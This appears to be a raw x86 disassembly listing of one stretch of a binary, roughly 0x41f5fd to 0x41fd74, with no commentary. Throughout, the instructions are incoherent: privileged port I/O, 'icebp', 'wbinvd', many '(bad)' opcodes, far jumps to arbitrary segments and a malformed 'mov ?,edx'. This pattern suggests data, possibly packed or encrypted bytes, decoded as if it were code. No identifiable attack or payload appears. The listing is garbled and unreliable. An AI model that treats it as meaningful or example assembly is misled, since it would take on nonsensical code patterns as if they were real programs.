  41f5fd:	adc    BYTE PTR [edx-0x29],dl
  41f600:	xchg   edi,eax
  41f601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f602:	mul    BYTE PTR [edi+0x448523dd]
  41f608:	ret    
  41f609:	mov    fs:0xdc8d5c8,eax
  41f60f:	fist   DWORD PTR [ecx+0x57]
  41f612:	in     eax,0x66
  41f614:	aam    0xbb
  41f616:	push   0x31
  41f618:	xchg   edi,eax
  41f619:	mov    ebp,DWORD PTR [eax+0x4a603a0d]
  41f61f:	into   
  41f620:	stc    
  41f621:	sbb    eax,0x92f0bfba
  41f626:	xlat   BYTE PTR ds:[ebx]
  41f627:	jbe    0x41f613
  41f629:	aas    
  41f62a:	pop    esi
  41f62b:	retf   
  41f62c:	stos   BYTE PTR es:[edi],al
  41f62d:	jno    0x41f5e7
  41f62f:	adc    DWORD PTR [edx],ecx
  41f631:	pop    edx
  41f632:	push   cs
  41f633:	jecxz  0x41f607
  41f635:	dec    ebx
  41f636:	arpl   WORD PTR [ebx+0x33d30536],bx
  41f63c:	pop    eax
  41f63d:	es fld QWORD PTR ds:[eax]
  41f641:	mov    cl,0x7
  41f643:	call   0x4dc72fe9
  41f648:	or     DWORD PTR [ecx-0x4a],esp
  41f64b:	das    
  41f64c:	add    al,BYTE PTR [esi+0x63]
  41f64f:	in     eax,0xd9
  41f651:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41f653:	ja     0x41f6b4
  41f655:	add    BYTE PTR [ebp-0x5c2a8a0],cl
  41f65b:	leave  
  41f65c:	adc    DWORD PTR [ecx+0x270be115],esi
  41f662:	(bad)  
  41f663:	fild   WORD PTR [edi+0x398ed2b0]
  41f669:	cs jg  0x41f6bc
  41f66c:	mov    bl,0x29
  41f66e:	adc    al,0xa3
  41f670:	pop    ecx
  41f671:	jmp    0x69f0:0x2af39a9d
  41f678:	mov    cl,0xf0
  41f67a:	(bad)  [esi+ebp*8-0x5a871266]
  41f681:	icebp  
  41f682:	imul   BYTE PTR [ebx-0x636048ff]
  41f688:	jl     0x41f660
  41f68a:	je     0x41f6da
  41f68c:	push   es
  41f68d:	and    DWORD PTR [edx],0xffffff94
  41f690:	lea    edx,[eax+0x7b]
  41f693:	div    BYTE PTR ds:0xd1b413bf
  41f699:	mov    cl,cl
  41f69b:	push   cs
  41f69c:	aam    0x51
  41f69e:	das    
  41f69f:	mov    ch,0xab
  41f6a1:	aaa    
  41f6a2:	lahf   
  41f6a3:	arpl   cx,dx
  41f6a5:	sbb    DWORD PTR cs:[ebp-0x7f182756],edi
  41f6ac:	(bad)  
  41f6ad:	rol    DWORD PTR [esi+0x2c541970],1
  41f6b3:	xchg   esi,eax
  41f6b4:	push   edi
  41f6b5:	sbb    eax,0xdc576484
  41f6ba:	icebp  
  41f6bb:	ins    BYTE PTR es:[edi],dx
  41f6bc:	lods   al,BYTE PTR ds:[esi]
  41f6bd:	test   eax,0x5cbfd603
  41f6c2:	stc    
  41f6c3:	cwde   
  41f6c4:	mov    ebp,0x5977d243
  41f6c9:	adc    al,0xd7
  41f6cb:	dec    edx
  41f6cc:	xchg   edx,eax
  41f6cd:	jp     0x41f6de
  41f6cf:	test   DWORD PTR ds:0xa19ba0e7,ebx
  41f6d5:	dec    ecx
  41f6d6:	pop    ebp
  41f6d7:	lods   al,BYTE PTR ds:[esi]
  41f6d8:	scas   al,BYTE PTR es:[edi]
  41f6d9:	mov    fs,WORD PTR fs:[esi+edi*2]
  41f6dd:	push   0x6dcfc865
  41f6e2:	ret    
  41f6e3:	dec    edi
  41f6e4:	xchg   ecx,eax
  41f6e5:	wbinvd 
  41f6e7:	js     0x41f691
  41f6e9:	imul   edi,DWORD PTR [eax],0xffffffa4
  41f6ec:	or     ah,ch
  41f6ee:	sbb    ah,BYTE PTR [esi+0x28ea81b6]
  41f6f4:	mov    WORD PTR [ecx],ss
  41f6f6:	call   FWORD PTR [ebp+0x54728472]
  41f6fc:	not    BYTE PTR [esi+0x1955e626]
  41f702:	or     eax,0xf4be3b7
  41f707:	lea    esp,[eax+0xcf5f352]
  41f70d:	dec    esi
  41f70e:	and    DWORD PTR [ebx-0x32],ebx
  41f711:	(bad)  
  41f712:	mov    eax,ds:0x67153c7b
  41f717:	and    esi,eax
  41f719:	pop    ds
  41f71a:	dec    ebp
  41f71b:	dec    ebp
  41f71c:	cmp    esp,DWORD PTR [eax-0x7c75b239]
  41f722:	mov    dl,0x9c
  41f724:	int    0xe1
  41f726:	or     al,0x17
  41f728:	mov    bl,0x9f
  41f72a:	xchg   ecx,eax
  41f72b:	les    esp,FWORD PTR [edx-0x77c1990a]
  41f731:	sub    BYTE PTR [ecx-0x6e6f6dad],ch
  41f737:	dec    esp
  41f738:	push   cs
  41f739:	mov    ebp,0x259ed903
  41f73e:	xor    al,0x76
  41f740:	test   BYTE PTR fs:[ebx-0x1b294d7],bh
  41f747:	xchg   DWORD PTR [edx+0x62],esi
  41f74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f74b:	xchg   BYTE PTR [eax-0x40b006c8],dh
  41f751:	xlat   BYTE PTR ds:[ebx]
  41f752:	adc    DWORD PTR [ecx+edi*2+0x2845ab9f],esp
  41f759:	int3   
  41f75a:	out    0x7c,eax
  41f75c:	fwait
  41f75d:	sub    DWORD PTR [edi+0x37e2831f],ebp
  41f763:	jo     0x41f6e7
  41f765:	sahf   
  41f766:	cmp    eax,0x8029d323
  41f76b:	cmp    ebp,DWORD PTR [eax-0x1]
  41f76e:	data16 adc dh,BYTE PTR [edi]
  41f771:	aad    0x13
  41f773:	push   esi
  41f774:	jge    0x41f71c
  41f776:	jae    0x41f72e
  41f778:	ins    BYTE PTR es:[edi],dx
  41f779:	enter  0x5e62,0x3b
  41f77d:	fwait
  41f77e:	adc    edi,DWORD PTR [eax]
  41f780:	fwait
  41f781:	mov    ah,0xa6
  41f783:	mov    ah,0x62
  41f785:	int3   
  41f786:	mov    ebx,0x94bd588a
  41f78b:	dec    esp
  41f78c:	data16 add al,0x83
  41f78f:	or     bl,BYTE PTR [esp+ebx*8]
  41f792:	pop    es
  41f793:	je     0x41f748
  41f795:	mov    dl,BYTE PTR [ecx]
  41f797:	shl    esp,1
  41f799:	mov    ecx,0x8d40d654
  41f79e:	or     al,0x7d
  41f7a0:	dec    eax
  41f7a1:	call   0x6451ffc0
  41f7a6:	aam    0x4b
  41f7a8:	rol    BYTE PTR [esi],cl
  41f7aa:	push   ebx
  41f7ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7ac:	in     al,0x2e
  41f7ae:	pop    esi
  41f7af:	aaa    
  41f7b0:	pop    eax
  41f7b1:	call   0xfda19108
  41f7b6:	hlt    
  41f7b7:	jne    0x41f812
  41f7b9:	cmp    eax,0xfb1e3eb5
  41f7be:	repnz test DWORD PTR [eax],ebx
  41f7c1:	in     eax,0x92
  41f7c3:	gs hlt 
  41f7c5:	loopne 0x41f799
  41f7c7:	lods   eax,DWORD PTR ds:[esi]
  41f7c8:	xchg   ebx,eax
  41f7c9:	outs   dx,DWORD PTR ds:[esi]
  41f7ca:	jecxz  0x41f771
  41f7cc:	cmp    eax,0x3dd80f1a
  41f7d1:	mov    al,dl
  41f7d3:	loopne 0x41f793
  41f7d5:	mov    cl,0xdb
  41f7d7:	rcr    esi,0x52
  41f7da:	mov    al,ds:0x32ae41b6
  41f7df:	stos   BYTE PTR es:[edi],al
  41f7e0:	ins    DWORD PTR es:[edi],dx
  41f7e1:	mov    al,0xe0
  41f7e3:	xor    ch,al
  41f7e5:	das    
  41f7e6:	push   es
  41f7e7:	xacquire xchg BYTE PTR [ecx+0x9],al
  41f7eb:	xchg   dh,bl
  41f7ed:	ret    0x53fc
  41f7f0:	dec    ebp
  41f7f1:	mov    ebp,0x5a9a29de
  41f7f6:	clc    
  41f7f7:	push   ebp
  41f7f8:	lahf   
  41f7f9:	imul   ebx,DWORD PTR [edi+0x13],0xcea5f6f8
  41f800:	cld    
  41f801:	push   cs
  41f802:	scas   eax,DWORD PTR es:[edi]
  41f803:	imul   ebx,DWORD PTR [ecx+ebp*8+0x74],0xe64ac6b3
  41f80b:	hlt    
  41f80c:	xor    al,0xb2
  41f80e:	push   edi
  41f80f:	dec    edi
  41f810:	ins    DWORD PTR es:[edi],dx
  41f811:	es pop edx
  41f813:	test   esi,0x6f3b0575
  41f819:	scas   eax,DWORD PTR es:[edi]
  41f81a:	add    esi,esp
  41f81c:	push   esp
  41f81d:	fld    QWORD PTR [edx]
  41f81f:	loope  0x41f7ec
  41f821:	adc    BYTE PTR [ebp+0xde9adb4],cl
  41f827:	pop    ecx
  41f828:	loopne 0x41f7de
  41f82a:	pushf  
  41f82b:	dec    eax
  41f82c:	xchg   ebp,eax
  41f82d:	and    eax,DWORD PTR [ebx-0x6acc99e7]
  41f833:	or     ebx,DWORD PTR [ebp-0x6985d8d7]
  41f839:	pop    edx
  41f83a:	sub    DWORD PTR [ebx],0x1e
  41f83d:	ror    BYTE PTR [edx+0x4f],1
  41f840:	and    DWORD PTR [esp+eax*1-0xd871e68],ebp
  41f847:	sahf   
  41f848:	cwde   
  41f849:	inc    esi
  41f84a:	xchg   ecx,esi
  41f84c:	ret    
  41f84d:	pushf  
  41f84e:	or     al,0x84
  41f850:	and    DWORD PTR [eax],esi
  41f852:	data16 stos BYTE PTR es:[edi],al
  41f854:	xor    DWORD PTR [ecx+0xf],ebp
  41f857:	es out dx,eax
  41f859:	add    DWORD PTR [edi+0x3],esp
  41f85c:	jns    0x41f869
  41f85e:	or     DWORD PTR [ecx],0x9b5e9955
  41f864:	and    eax,0xa5186fa2
  41f869:	sbb    al,0x87
  41f86b:	je     0x41f826
  41f86d:	mov    ?,edx
  41f86f:	aas    
  41f870:	mov    ds:0x10349577,eax
  41f875:	bound  ecx,QWORD PTR [esi]
  41f877:	mov    edi,0xdba24749
  41f87c:	mov    esi,0x5b4dacf0
  41f881:	fwait
  41f882:	aas    
  41f883:	mov    BYTE PTR [edi],dl
  41f885:	cmp    eax,0x66c72709
  41f88a:	mov    esi,0x14de9501
  41f88f:	jl     0x41f852
  41f891:	call   0xbb221835
  41f896:	adc    bh,BYTE PTR [esi]
  41f898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f899:	push   0x8953402c
  41f89e:	out    0x67,al
  41f8a0:	iret   
  41f8a1:	pushf  
  41f8a2:	dec    esi
  41f8a3:	mov    BYTE PTR [ecx],ah
  41f8a5:	mov    al,ds:0x4c8214bc
  41f8aa:	sti    
  41f8ab:	cmp    bl,al
  41f8ad:	xchg   edx,eax
  41f8ae:	lods   eax,DWORD PTR ds:[esi]
  41f8af:	enter  0x6efe,0x54
  41f8b3:	mov    eax,0xe4ac6018
  41f8b8:	push   esp
  41f8b9:	pop    esp
  41f8ba:	push   esi
  41f8bb:	adc    BYTE PTR [ebx+edi*1+0x2a3f4aa4],bl
  41f8c2:	lahf   
  41f8c3:	pop    es
  41f8c4:	pop    esp
  41f8c5:	mov    ecx,0x342d1b41
  41f8ca:	mov    ah,0x5b
  41f8cc:	jmp    0x1ce2:0xbcc58e84
  41f8d3:	pop    edx
  41f8d4:	and    al,0xfe
  41f8d6:	jmp    0x41f898
  41f8d8:	stos   BYTE PTR es:[edi],al
  41f8d9:	rol    DWORD PTR ds:0xd3ba7d93,0x6e
  41f8e0:	sub    edx,DWORD PTR [ebp-0x2a]
  41f8e3:	adc    al,0x1
  41f8e5:	leave  
  41f8e6:	ja     0x41f94f
  41f8e8:	and    al,0x95
  41f8ea:	mov    DWORD PTR [esi+0x2b],ebx
  41f8ed:	hlt    
  41f8ee:	cmp    al,0xda
  41f8f0:	adc    ch,dl
  41f8f2:	(bad)  
  41f8f3:	add    al,0x3e
  41f8f5:	popf   
  41f8f6:	sbb    ah,BYTE PTR [edx+0x20]
  41f8f9:	leave  
  41f8fa:	push   edi
  41f8fb:	(bad)  [eax]
  41f8fd:	fist   DWORD PTR [ebp-0x3dbdd1d8]
  41f903:	std    
  41f904:	mov    ecx,DWORD PTR [ebp-0x60]
  41f907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f908:	xchg   edx,eax
  41f909:	ds push ds
  41f90b:	xor    ebp,DWORD PTR [ebx-0x214a2a56]
  41f911:	es jb  0x41f96d
  41f914:	sar    dl,0x3e
  41f917:	lods   al,BYTE PTR ds:[esi]
  41f918:	pop    ss
  41f919:	push   es
  41f91a:	adc    DWORD PTR [edx],0x5e
  41f91d:	neg    DWORD PTR [ebp-0x2e]
  41f920:	push   0xffffffe2
  41f922:	into   
  41f923:	nop
  41f924:	ss pop ebx
  41f926:	lods   eax,DWORD PTR ds:[esi]
  41f927:	xor    eax,0x6faf1404
  41f92c:	or     dh,BYTE PTR [ecx]
  41f92e:	jae    0x41f96e
  41f930:	cmp    al,0xe3
  41f932:	fisttp DWORD PTR [eax-0x60352b81]
  41f938:	je     0x41f9aa
  41f93a:	lods   al,BYTE PTR ds:[esi]
  41f93b:	add    ebx,0xfb2b94ca
  41f941:	(bad)  
  41f942:	fisttp QWORD PTR [ebx]
  41f944:	mov    cl,0xe
  41f946:	add    eax,0x9e79e050
  41f94b:	adc    DWORD PTR [eax-0x73],esp
  41f94e:	popa   
  41f94f:	mov    WORD PTR [ebx],cs
  41f951:	mov    al,ds:0xf85cdfa9
  41f956:	jge    0x41f9a4
  41f958:	test   DWORD PTR [ecx+esi*8],ebx
  41f95b:	imul   edi,DWORD PTR [esi+eax*2],0xdc6338b7
  41f962:	dec    ecx
  41f963:	sub    ebp,edi
  41f965:	es enter 0x68de,0x50
  41f96a:	pushf  
  41f96b:	pop    ebx
  41f96c:	ins    DWORD PTR es:[di],dx
  41f96e:	or     ecx,eax
  41f970:	jo     0x41f99c
  41f972:	cmp    cl,BYTE PTR [bp-0x40]
  41f976:	xor    eax,0x4844e1b0
  41f97b:	stos   DWORD PTR es:[edi],eax
  41f97c:	cmc    
  41f97d:	scas   al,BYTE PTR es:[edi]
  41f97e:	out    0xd0,eax
  41f980:	dec    esi
  41f981:	addr16 cmp ecx,eax
  41f984:	push   edx
  41f985:	sub    al,0xc3
  41f987:	imul   ecx,esi,0x901abf96
  41f98d:	(bad)  
  41f98f:	clc    
  41f990:	dec    ecx
  41f991:	loope  0x41f99e
  41f993:	sar    DWORD PTR [ebx],0xd8
  41f996:	dec    eax
  41f997:	xchg   BYTE PTR [edx],bl
  41f999:	int3   
  41f99a:	jge    0x41f9a0
  41f99c:	xchg   di,ax
  41f99e:	sub    cl,dl
  41f9a0:	daa    
  41f9a1:	push   0x10
  41f9a3:	add    cl,bl
  41f9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9a6:	rcl    bh,0xc2
  41f9a9:	jo     0x41f9a8
  41f9ab:	cmp    ebp,DWORD PTR [ebp-0x54]
  41f9ae:	ins    DWORD PTR es:[edi],dx
  41f9af:	fld    TBYTE PTR [ecx]
  41f9b1:	adc    BYTE PTR [eax],ch
  41f9b3:	adc    al,0xcb
  41f9b5:	xchg   ebx,eax
  41f9b6:	scas   al,BYTE PTR es:[edi]
  41f9b7:	push   0xc64df1b8
  41f9bc:	xchg   ebp,eax
  41f9bd:	outs   dx,BYTE PTR ds:[esi]
  41f9be:	mov    gs,WORD PTR [edx-0x66]
  41f9c1:	lock adc ah,al
  41f9c4:	and    BYTE PTR ds:0x26ace4a1,dh
  41f9ca:	call   0xe502:0x249fa5b7
  41f9d1:	push   0x94f8b8e6
  41f9d6:	xchg   ebp,eax
  41f9d7:	push   0x7
  41f9d9:	sub    al,0x4b
  41f9db:	mov    DWORD PTR [ecx+0x1a],ebp
  41f9de:	xchg   esp,eax
  41f9df:	out    0x71,eax
  41f9e1:	cmp    al,BYTE PTR [ecx]
  41f9e3:	mov    eax,0x8dd43bba
  41f9e8:	add    DWORD PTR [edx-0x723a7afa],esi
  41f9ee:	mov    esp,0xc6d1d3af
  41f9f3:	in     al,0x24
  41f9f5:	xchg   ecx,eax
  41f9f6:	inc    esi
  41f9f7:	or     ecx,esi
  41f9f9:	jb     0x41fa5e
  41f9fb:	push   ebp
  41f9fc:	nop
  41f9fd:	push   ebx
  41f9fe:	mov    al,ds:0x7ef1c8c3
  41fa03:	inc    esi
  41fa04:	(bad)  gs:[ebp+0x6c]
  41fa08:	out    dx,al
  41fa09:	mov    DWORD PTR [eax-0x65dfb2f9],ecx
  41fa0f:	int3   
  41fa10:	cmp    DWORD PTR [edi],0x7c07de4f
  41fa16:	fwait
  41fa17:	sahf   
  41fa18:	push   ebp
  41fa19:	sub    BYTE PTR [ebp+0x17bcc136],dl
  41fa1f:	dec    edi
  41fa20:	es jns 0x41fa90
  41fa23:	jp     0x41fa53
  41fa25:	or     al,0xd
  41fa27:	fimul  DWORD PTR [eax+0x25]
  41fa2a:	icebp  
  41fa2b:	adc    ebx,esi
  41fa2d:	and    ecx,DWORD PTR [esi]
  41fa2f:	add    DWORD PTR ds:0xc68ff96,ebx
  41fa35:	test   DWORD PTR [ebp+0x58],edi
  41fa38:	fst    QWORD PTR [esi+ebx*1-0x2afb5de6]
  41fa3f:	and    DWORD PTR [ebp+0x34c3f1c9],edx
  41fa45:	pop    edi
  41fa46:	fdiv   DWORD PTR [esi-0xa]
  41fa49:	mov    ds:0xa03b9227,eax
  41fa4e:	jmp    0xc9f9e6c2
  41fa53:	and    eax,0xfee0ee8f
  41fa58:	call   0x65b7e545
  41fa5d:	(bad)  
  41fa5f:	mov    al,ds:0xcee15d74
  41fa64:	sub    eax,0x41dd1fca
  41fa69:	mov    es,WORD PTR [edi]
  41fa6b:	sbb    esp,ecx
  41fa6d:	je     0x41fa3c
  41fa6f:	inc    edx
  41fa70:	test   BYTE PTR ds:0x88b6dee5,bh
  41fa76:	cmp    BYTE PTR [eax+0x4468a129],cl
  41fa7c:	fdiv   st(3),st
  41fa7e:	sub    DWORD PTR ds:0x7741f942,ebx
  41fa84:	add    BYTE PTR [esi],ch
  41fa86:	test   al,0x65
  41fa88:	adc    eax,0x60c09af3
  41fa8d:	or     DWORD PTR [ebp+ebx*1-0x19fccb98],esp
  41fa94:	(bad)  
  41fa95:	not    edx
  41fa97:	aad    0xc1
  41fa99:	daa    
  41fa9a:	pop    ds
  41fa9b:	mov    ecx,0x96a4446e
  41faa0:	ret    0x164c
  41faa3:	addr16 dec edi
  41faa5:	sbb    ebx,DWORD PTR [ecx+0x1b]
  41faa8:	lock dec ebp
  41faaa:	out    dx,eax
  41faab:	loopne 0x41fa38
  41faad:	aad    0xf4
  41faaf:	ror    esp,cl
  41fab1:	add    al,0xf7
  41fab3:	dec    ebp
  41fab4:	inc    edx
  41fab5:	addr16 cli 
  41fab7:	pop    ss
  41fab8:	sub    DWORD PTR [ecx-0xa],edx
  41fabb:	call   DWORD PTR [edi-0x56]
  41fabe:	repz jmp 0x86605352
  41fac4:	xor    DWORD PTR [ebx-0x5516f90c],0x3b
  41facb:	aas    
  41facc:	sbb    bl,bh
  41face:	mov    esp,0x5b2a1d01
  41fad3:	sub    BYTE PTR [ecx-0x27],ah
  41fad6:	int    0xe5
  41fad8:	sti    
  41fad9:	mov    ecx,0xd9412667
  41fade:	mov    eax,0x7890a639
  41fae3:	aaa    
  41fae4:	les    esi,FWORD PTR [ebx+0x3d]
  41fae7:	jmp    0x78e690fe
  41faec:	sahf   
  41faed:	jb     0x41fa79
  41faef:	arpl   WORD PTR ds:0xc8e6073c,dx
  41faf5:	and    esi,DWORD PTR [ebx+0x6ea3912c]
  41fafb:	sti    
  41fafc:	xchg   ebx,eax
  41fafd:	jbe    0x41fa9c
  41faff:	call   0x4fc8:0x50b8aa0d
  41fb06:	dec    esp
  41fb07:	das    
  41fb08:	fidivr DWORD PTR [edx+0x5c]
  41fb0b:	das    
  41fb0c:	push   edi
  41fb0d:	mov    DWORD PTR [edx+0x5e4c8d1d],esp
  41fb13:	cs std 
  41fb15:	ficomp WORD PTR [edi+0x587d879f]
  41fb1b:	push   edx
  41fb1c:	test   al,0xd
  41fb1e:	jmp    0x41facf
  41fb20:	jmp    0x44df:0xcadc3729
  41fb27:	push   edx
  41fb28:	jns    0x41fab2
  41fb2a:	call   0xf4d6:0x5699c78b
  41fb31:	test   DWORD PTR [ebx+0x63],ecx
  41fb34:	mov    ebp,eax
  41fb36:	ret    0x3beb
  41fb39:	div    DWORD PTR [edx+0x14216612]
  41fb3f:	les    edx,FWORD PTR [esi-0x1f]
  41fb42:	pop    ecx
  41fb43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb44:	(bad)  
  41fb45:	jmp    0x41fb67
  41fb47:	loop   0x41fb8b
  41fb49:	fiadd  WORD PTR cs:[edx-0x58]
  41fb4d:	fwait
  41fb4e:	sar    edi,0x12
  41fb51:	das    
  41fb52:	xchg   edi,eax
  41fb53:	fs retf 
  41fb55:	push   eax
  41fb56:	pusha  
  41fb57:	pop    ds
  41fb58:	mov    edx,0x4f7203b8
  41fb5d:	stos   BYTE PTR es:[edi],al
  41fb5e:	xor    eax,0x9feef89c
  41fb63:	mov    ch,0xb1
  41fb65:	jmp    0x8c46df14
  41fb6a:	scas   al,BYTE PTR es:[edi]
  41fb6b:	jbe    0x41fb47
  41fb6d:	pop    ecx
  41fb6e:	xchg   esp,eax
  41fb6f:	jae    0x41fb87
  41fb71:	xlat   BYTE PTR ds:[ebx]
  41fb72:	js     0x41fb0e
  41fb74:	mov    DWORD PTR [eax],ebx
  41fb76:	(bad)  
  41fb78:	int3   
  41fb79:	daa    
  41fb7a:	test   ch,bh
  41fb7c:	sub    BYTE PTR [ebp+0x23],bh
  41fb7f:	add    DWORD PTR [ebx],0xbf058699
  41fb85:	add    esp,DWORD PTR [eax-0x1118c784]
  41fb8b:	adc    al,0x96
  41fb8d:	inc    esi
  41fb8e:	inc    ecx
  41fb8f:	pop    ecx
  41fb90:	sbb    ebp,DWORD PTR [ebx-0x4d]
  41fb93:	xchg   esi,eax
  41fb94:	pushf  
  41fb95:	and    dh,dh
  41fb97:	sub    bh,ah
  41fb99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb9a:	mov    bl,0x93
  41fb9c:	dec    esi
  41fb9d:	adc    ebx,esi
  41fb9f:	in     al,dx
  41fba0:	(bad)  
  41fba1:	dec    ebx
  41fba2:	xchg   edi,eax
  41fba3:	adc    ah,dl
  41fba5:	inc    esi
  41fba6:	cmp    DWORD PTR ds:0xc1e3b985,esp
  41fbac:	adc    BYTE PTR [edi],0x58
  41fbaf:	jo     0x41fbb5
  41fbb1:	arpl   WORD PTR [esi+0x7d],si
  41fbb4:	test   al,0x29
  41fbb6:	or     DWORD PTR [ebx],0xa135cb19
  41fbbc:	cli    
  41fbbd:	dec    ebp
  41fbbe:	es xor al,0x9f
  41fbc1:	pushf  
  41fbc2:	pop    eax
  41fbc3:	(bad)  
  41fbc4:	lods   eax,DWORD PTR ds:[esi]
  41fbc5:	mov    esp,0xebc35244
  41fbca:	xor    eax,0xe1e3bd01
  41fbcf:	hlt    
  41fbd0:	out    0x98,eax
  41fbd2:	inc    ebp
  41fbd3:	not    DWORD PTR [eax]
  41fbd5:	jo     0x41fba0
  41fbd7:	inc    ecx
  41fbd8:	cmp    DWORD PTR [eax],0x2d
  41fbdb:	jmp    0x1d8c:0xdd661c87
  41fbe2:	(bad)  
  41fbe3:	xor    al,0x79
  41fbe5:	jne    0x41fc2d
  41fbe7:	xor    BYTE PTR [esi],al
  41fbe9:	cld    
  41fbea:	sub    eax,0x79f935fb
  41fbef:	and    BYTE PTR [ebp-0x37],ah
  41fbf2:	xchg   ecx,eax
  41fbf4:	(bad)  
  41fbf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbf6:	je     0x41fc00
  41fbf8:	sbb    DWORD PTR cs:[ebx],0x708de10e
  41fbff:	(bad)  
  41fc00:	popa   
  41fc01:	in     al,0x9c
  41fc03:	dec    ebx
  41fc04:	aam    0x81
  41fc06:	ficom  WORD PTR [esi+0x1b517d24]
  41fc0c:	mov    ch,0x4
  41fc0e:	sub    cl,BYTE PTR [edi+0x75]
  41fc11:	cmp    esp,DWORD PTR [edi-0x7ea00011]
  41fc17:	aaa    
  41fc18:	out    dx,eax
  41fc19:	in     al,dx
  41fc1a:	cdq    
  41fc1b:	adc    bl,dl
  41fc1d:	pop    edx
  41fc1e:	sub    ah,BYTE PTR [ecx+0x4]
  41fc21:	cmp    ah,BYTE PTR [ecx+ebp*1-0x7868802c]
  41fc28:	mov    ebx,0xfc484c27
  41fc2d:	mov    eax,0xa3db595f
  41fc32:	das    
  41fc33:	sbb    al,0x26
  41fc35:	mov    ds:0x531d13f1,al
  41fc3a:	xchg   edi,eax
  41fc3b:	xor    bh,bh
  41fc3d:	pop    ebp
  41fc3e:	xor    dl,BYTE PTR [edx]
  41fc40:	and    al,BYTE PTR [edx-0x76]
  41fc43:	mov    dh,0x5
  41fc45:	cs mov WORD PTR ss:[edx-0x783099c3],fs
  41fc4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc4e:	lods   eax,DWORD PTR ds:[esi]
  41fc4f:	sbb    al,0x48
  41fc51:	mov    edi,0x17717cea
  41fc56:	fs pop ebp
  41fc58:	jmp    0xe60ca705
  41fc5d:	sub    al,0x3e
  41fc5f:	call   0x95d1:0xedb991f0
  41fc66:	mov    bl,0x60
  41fc68:	inc    esi
  41fc69:	pop    esi
  41fc6a:	aam    0xbf
  41fc6c:	out    dx,al
  41fc6d:	cwde   
  41fc6e:	pop    eax
  41fc6f:	jmp    0xb8d896d3
  41fc74:	jb     0x41fc44
  41fc76:	push   es
  41fc77:	out    dx,al
  41fc78:	jo     0x41fc2f
  41fc7a:	call   0x19a3:0x11931c12
  41fc81:	and    esi,DWORD PTR [esi+ecx*2-0xf]
  41fc85:	pop    ecx
  41fc86:	sub    cl,0x13
  41fc89:	jmp    0x41fc57
  41fc8b:	(bad)  
  41fc8c:	dec    ebp
  41fc8d:	sub    eax,0x1e87ce53
  41fc92:	idiv   ebp
  41fc94:	jp     0x41fc2a
  41fc96:	push   es
  41fc97:	aas    
  41fc98:	nop
  41fc99:	ins    BYTE PTR es:[edi],dx
  41fc9a:	adc    eax,DWORD PTR [ebp+0x47]
  41fc9d:	(bad)  
  41fc9e:	jbe    0x41fcd2
  41fca0:	jmp    0x41fcf7
  41fca2:	test   eax,0xc35361e1
  41fca7:	mov    dh,0xe5
  41fca9:	adc    eax,0x31292989
  41fcae:	and    eax,0x3f1f818e
  41fcb3:	dec    eax
  41fcb4:	addr16 adc al,0xc2
  41fcb7:	gs xchg ebp,eax
  41fcb9:	mov    edx,0x191c259e
  41fcbe:	ins    DWORD PTR es:[edi],dx
  41fcbf:	jmp    0x41fc6c
  41fcc1:	leave  
  41fcc2:	hlt    
  41fcc3:	pop    ecx
  41fcc4:	or     ah,dl
  41fcc6:	adc    edx,ebx
  41fcc8:	mov    ds:0x405ae90f,eax
  41fccd:	mov    al,0x5e
  41fccf:	fld    QWORD PTR [ecx-0x5e]
  41fcd2:	or     al,0xbe
  41fcd4:	xor    BYTE PTR [edx],dh
  41fcd6:	push   ecx
  41fcd7:	and    al,0xc0
  41fcd9:	popa   
  41fcda:	pop    esi
  41fcdb:	jne    0x41fd08
  41fcdd:	aas    
  41fcde:	and    BYTE PTR [ebx],0x52
  41fce1:	pop    ebx
  41fce2:	nop
  41fce3:	ins    DWORD PTR es:[edi],dx
  41fce4:	outs   dx,BYTE PTR ds:[esi]
  41fce5:	cli    
  41fce6:	push   eax
  41fce7:	test   al,0x8
  41fce9:	clc    
  41fcea:	lar    ebx,bp
  41fced:	shl    DWORD PTR [ecx+0x38cfa2cc],1
  41fcf3:	(bad)  
  41fcf4:	loop   0x41fd05
  41fcf6:	dec    esp
  41fcf7:	jno    0x41fd36
  41fcf9:	xchg   edx,eax
  41fcfa:	lock clts 
  41fcfd:	icebp  
  41fcfe:	pop    edx
  41fcff:	fdiv   st(6),st
  41fd01:	fild   DWORD PTR ds:0x3534ce39
  41fd07:	ja     0x41fcff
  41fd09:	je     0x41fd66
  41fd0b:	or     esp,ebx
  41fd0d:	mov    eax,ds:0x36ccd020
  41fd12:	in     eax,0x2d
  41fd14:	sub    bl,ah
  41fd16:	push   esi
  41fd17:	aaa    
  41fd18:	cmp    al,0x14
  41fd1a:	mov    ds:0xb713c34c,eax
  41fd1f:	sar    BYTE PTR [ebx+eax*1+0x28],1
  41fd23:	mov    al,0x93
  41fd25:	sbb    edi,ecx
  41fd27:	adc    esp,DWORD PTR [ecx]
  41fd29:	(bad)  
  41fd2a:	outs   dx,DWORD PTR ds:[esi]
  41fd2b:	fwait
  41fd2c:	in     eax,0x45
  41fd2e:	xor    al,0xd
  41fd30:	push   eax
  41fd31:	addr16 inc esi
  41fd33:	cld    
  41fd34:	int3   
  41fd35:	dec    ebx
  41fd36:	mov    ecx,0x60be716f
  41fd3b:	jnp    0x41fd7c
  41fd3d:	test   BYTE PTR [ebx+0x55ef621c],ch
  41fd43:	jp     0x41fd95
  41fd45:	and    edx,DWORD PTR ss:[ebx-0x26]
  41fd49:	xor    eax,edx
  41fd4b:	mov    al,ds:0x282e7915
  41fd50:	fmul   DWORD PTR [edx+eiz*4+0x30e05483]
  41fd57:	adc    ecx,ebp
  41fd59:	pop    es
  41fd5a:	jle    0x41fd86
  41fd5c:	sub    al,al
  41fd5e:	cmp    al,0x85
  41fd60:	cmp    al,0x88
  41fd62:	mov    al,cs:0x4cb9a8e0
  41fd68:	lahf   
  41fd69:	pop    esi
  41fd6a:	jmp    0x5bfad8e4
  41fd6f:	arpl   WORD PTR [edi+0xe],ax
  41fd72:	lock push es
  41fd74:	retf   0x6a14
